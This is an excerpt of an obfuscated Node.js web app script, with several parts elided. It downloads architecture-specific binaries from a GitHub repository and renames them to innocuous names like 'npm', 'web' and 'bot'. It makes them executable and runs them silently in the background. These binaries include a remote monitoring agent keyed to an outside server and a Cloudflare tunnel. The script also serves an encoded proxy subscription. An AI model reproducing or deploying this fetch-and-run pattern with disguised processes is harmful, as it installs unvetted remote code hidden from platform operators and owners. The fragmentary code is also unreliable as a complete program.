...
function cleanupOldFiles() {
  pathsToDelete.forEach(_0x23f7be => {
    ...
    fs.unlink(_0x647eeb, _0x41caf4 => {
      if (_0x41caf4) {
        console.error("Skip Delete " + _0x647eeb);
      } else {
        console.log(_0x647eeb + " deleted");
      }
    });
  });
}
cleanupOldFiles();
app.get('/', function (_0x6ca981, _0x185a31) {
...
function downloadFile(_0x5e911a, _0xc87047, _0x46b345) {
  ...
  const _0x4a25fd = fs.createWriteStream(_0x24b3ee);
  axios({
    'method': "get",
    'url': _0xc87047,
    'responseType': "stream"
  }).then(_0x3aecb9 => {
    _0x3aecb9.data.pipe(_0x4a25fd);
    _0x4a25fd.on("finish", () => {
      _0x4a25fd.close();
      console.log("Download " + _0x5e911a + " successfully");
      _0x46b345(null, _0x5e911a);
    });
    _0x4a25fd.on("error", _0x5e3f83 => {
      fs.unlink(_0x24b3ee, () => {});
      const _0x1d9ca9 = "Download " + _0x5e911a + " failed: " + _0x5e3f83.message;
      console.error(_0x1d9ca9);
      _0x46b345(_0x1d9ca9);
    });
  })['catch'](_0x6dec02 => {
    const _0x3b48ce = "Download " + _0x5e911a + " failed: " + _0x6dec02.message;
    console.error(_0x3b48ce);
    _0x46b345(_0x3b48ce);
  });
}
async function downloadFilesAndRun() {
  const _0x1e3bf1 = getSystemArchitecture();
  const _0x3f5fae = getFilesForArchitecture(_0x1e3bf1);
  ...
  function _0x319884(_0x4dfea4) {
    _0x4dfea4.forEach(_0x58dd32 => {
      ...
      fs.chmod(_0x124a55, 0x1fd, _0x60c289 => {
        if (_0x60c289) {
          console.error("Empowerment failed for " + _0x124a55 + ": " + _0x60c289);
        } else {
          console.log("Empowerment success for " + _0x124a55 + ": " + 0x1fd.toString(0x8));
        }
      });
    });
  }
  ...
  if (NEZHA_SERVER && NEZHA_PORT && NEZHA_KEY) {
    ...
    if (_0x2fedc0.includes(NEZHA_PORT)) {
      _0xf5c50e = "--tls";
    } else {
      _0xf5c50e = '';
    }
    const _0x199467 = "nohup " + FILE_PATH + "/npm -s " + NEZHA_SERVER + ':' + NEZHA_PORT + " -p " + NEZHA_KEY + " " + _0xf5c50e + " --disable-auto-update --disable-force-update >/dev/null 2>&1 &";
    try {
      await exec(_0x199467);
      console.log("npm is running");
      await new Promise(_0x2c594a => setTimeout(_0x2c594a, 0x3e8));
    } catch (_0x5c665a) {
  ...
  try {
    await exec(_0x4b6202);
    console.log("web is running");
    await new Promise(_0x272c20 => setTimeout(_0x272c20, 0x3e8));
  } catch (_0x3fd99b) {
  ...
  if (fs.existsSync(path.join(FILE_PATH, "bot"))) {
    ...
    if (ARGO_AUTH.match(/^[A-Z0-9a-z=]{120,250}$/)) {
      _0x32b5c2 = "tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token " + ARGO_AUTH;
    } else if (ARGO_AUTH.match(/TunnelSecret/)) {
      _0x32b5c2 = "tunnel --edge-ip-version auto --config " + FILE_PATH + "/tunnel.yml run";
    } else {
      _0x32b5c2 = "tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile " + FILE_PATH + "/boot.log --loglevel info --url http://localhost:" + ARGO_PORT;
    }
    try {
      await exec("nohup " + FILE_PATH + "/bot " + _0x32b5c2 + " >/dev/null 2>&1 &");
      console.log("bot is running");
      await new Promise(_0x4640e0 => setTimeout(_0x4640e0, 0x7d0));
    } catch (_0x4ad681) {
...
function getFilesForArchitecture(_0x1383b3) {
  if (_0x1383b3 === 'arm') {
    return [{
      'fileName': "npm",
      'fileUrl': "https://raw.githubusercontent.com/KrebsGeorge/paas/refs/heads/main/arm64/swith"
    }, {
      'fileName': "web",
      'fileUrl': "https://raw.githubusercontent.com/KrebsGeorge/paas/refs/heads/main/arm64/x/web"
    }, {
      'fileName': 'bot',
      'fileUrl': "https://raw.githubusercontent.com/KrebsGeorge/paas/refs/heads/main/amd64/bot13"
    }];
  } else {
    if (_0x1383b3 === "amd") {
      return [{
        'fileName': "npm",
        'fileUrl': "https://raw.githubusercontent.com/KrebsGeorge/paas/refs/heads/main/amd64/swith"
      }, {
        'fileName': "web",
        'fileUrl': "https://raw.githubusercontent.com/KrebsGeorge/paas/refs/heads/main/amd64/x.web"
      }, {
        'fileName': "bot",
        'fileUrl': 'https://raw.githubusercontent.com/KrebsGeorge/paas/refs/heads/main/amd64/bot13'
      }];
...
async function extractDomains() {
  let _0x502853;
  if (ARGO_AUTH && ARGO_DOMAIN) {
    _0x502853 = ARGO_DOMAIN;
    console.log('ARGO_DOMAIN:', _0x502853);
    await _0x64980a(_0x502853);
  } else {
    try {
      const _0xd83813 = fs.readFileSync(path.join(FILE_PATH, "boot.log"), "utf-8");
      const _0x331611 = _0xd83813.split("\n");
      const _0x4a054c = [];
      ...
      if (_0x4a054c.length > 0x0) {
        _0x502853 = _0x4a054c[0x0];
        console.log("ArgoDomain:", _0x502853);
        await _0x64980a(_0x502853);
      } else {
        console.log("ArgoDomain not found, re-running bot to obtain ArgoDomain");
        fs.unlinkSync(path.join(FILE_PATH, 'boot.log'));
        await new Promise(_0x3ff9ea => setTimeout(_0x3ff9ea, 0x7d0));
        ...
        try {
          await exec("nohup " + path.join(FILE_PATH, 'bot') + " " + _0x5d2160 + " >/dev/null 2>&1 &");
          console.log("bot is running.");
          await new Promise(_0x364fc6 => setTimeout(_0x364fc6, 0xbb8));
  ...
  async function _0x64980a(_0x480312) {
    ...
    const _0x6f3d38 = _0x56db99.trim();
    return new Promise(_0x2b742a => {
      setTimeout(() => {
        ...
        fs.writeFileSync(_0x1f4aba, Buffer.from(_0x17ff11).toString("base64"));
        console.log(FILE_PATH + "/sub.txt saved successfully");
        app.get('/sub', (_0x443afd, _0x45e424) => {
          const _0x3ef68a = Buffer.from(_0x17ff11).toString('base64');
          _0x45e424.set("Content-Type", "text/plain; charset=utf-8");
          _0x45e424.send(_0x3ef68a);
        });
        _0x2b742a(_0x17ff11);
      }, 0x7d0);
    });
